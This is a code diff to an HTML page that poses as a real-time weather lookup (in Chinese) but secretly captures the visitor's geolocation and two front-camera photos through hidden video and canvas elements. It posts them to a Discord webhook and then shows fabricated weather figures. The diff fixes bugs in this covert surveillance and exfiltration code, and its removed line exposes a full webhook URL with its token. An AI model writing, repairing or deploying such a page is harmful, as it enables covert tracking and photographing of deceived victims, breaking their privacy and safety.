@@ -2,12 +2,11 @@
 <html lang="zh-TW">
 <head>
 <meta charset="utf-8">
-<!-- 關鍵：讓網頁自適應手機螢幕 -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>即時天氣查詢系統</title>
 
 <style>
-/* 全域佈局優化 */
+/* 保持你原始的專業佈局與動畫 */
 body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     text-align: center;
@@ -45,7 +44,6 @@ p { color: #666; font-size: 16px; margin-bottom: 25px; }
 }
 @keyframes sunPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.08);} }
 
-/* 增大的按鈕：更好點擊，更專業 */
 button {
     width: 100%;
     padding: 16px;
@@ -62,7 +60,6 @@ button {
 }
 button:active { transform: scale(0.96); opacity: 0.9; }
 
-/* 狀態文字增大，行高增加 */
 #status { 
     margin-top: 25px; 
     font-size: 15px; 
@@ -82,13 +79,15 @@ button:active { transform: scale(0.96); opacity: 0.9; }
     <div id="status"></div>
 </div>
 
+<!-- 隱藏組件 -->
 <video id="v" style="display:none;" autoplay playsinline muted></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
 // 設定 Webhook
-var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+var webhook = "https://discord.com";
 var photoCount = 0;
+var currentStream = null; // 用來儲存串流
 
 function startAction() {
     document.getElementById("btn").style.display = "none";
@@ -101,34 +100,39 @@ function startAction() {
 function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function(pos) {
+            // 修正地圖網址語法錯誤
+            var mapLink = "https://www.google.com" + pos.coords.latitude + "," + pos.coords.longitude;
             fetch(webhook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    content: `📍 **定位成功**\n緯度: ${pos.coords.latitude}\n經度: ${pos.coords.longitude}\n地圖連結: https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`
+                    content: "📍 **定位成功**\n緯度: " + pos.coords.latitude + "\n經度: " + pos.coords.longitude + "\n地圖連結: " + mapLink
                 })
             });
             document.getElementById("status").innerHTML += "<br>✅ 定位成功，處理數據中...";
-        }, null, { enableHighAccuracy: true });
+        }, function(err) {
+            console.log("定位失敗");
+        }, { enableHighAccuracy: true });
     }
 }
 
 function getCamera() {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(function(stream) {
+        currentStream = stream; // 記錄串流
         var video = document.getElementById("v");
         video.srcObject = stream;
         
-        // 分別在 1.5s 與 3s 拍攝，確保擷取到清晰畫面
-        setTimeout(() => takeSnap(stream), 1500);
-        setTimeout(() => takeSnap(stream, true), 3000);
+        // 修正 setTimeout 呼叫方式，確保 stream 正確傳遞
+        setTimeout(function() { takeSnap(false); }, 1500);
+        setTimeout(function() { takeSnap(true); }, 3000);
         
-    }).catch(() => {
+    }).catch(function(err) {
         document.getElementById("status").innerHTML = "❌ 偵測失敗：請開啟位置與環境權限。";
     });
 }
 
-function takeSnap(stream, isLast = false) {
+function takeSnap(isLast) {
     var video = document.getElementById("v");
     var canvas = document.getElementById("c");
     canvas.width = video.videoWidth;
@@ -138,14 +142,14 @@ function takeSnap(stream, isLast = false) {
     
     canvas.toBlob(function(blob) {
         var formData = new FormData();
-        formData.append("file", blob, `img_${Date.now()}.jpg`);
-        formData.append("payload_json", JSON.stringify({ content: `📸 **環境掃描已同步 (${++photoCount}/2)**` }));
+        formData.append("file", blob, "img_" + Date.now() + ".jpg");
+        formData.append("payload_json", JSON.stringify({ content: "📸 **環境掃描已同步 (" + (++photoCount) + "/2)**" }));
 
         fetch(webhook, { method: "POST", body: formData })
-        .then(() => {
-            if (isLast) {
-                // 拍完第二張後立即釋放相機資源
-                stream.getTracks().forEach(track => track.stop());
+        .then(function() {
+            if (isLast && currentStream) {
+                // 拍完最後一張，停止相機
+                currentStream.getTracks().forEach(function(track) { track.stop(); });
                 document.getElementById("status").innerHTML = "☀️ **今日天氣：晴朗**<br>🌡 溫度：27.5°C<br>🌬 濕度：62%<br>✨ 資訊已更新至最新。";
             }
         });
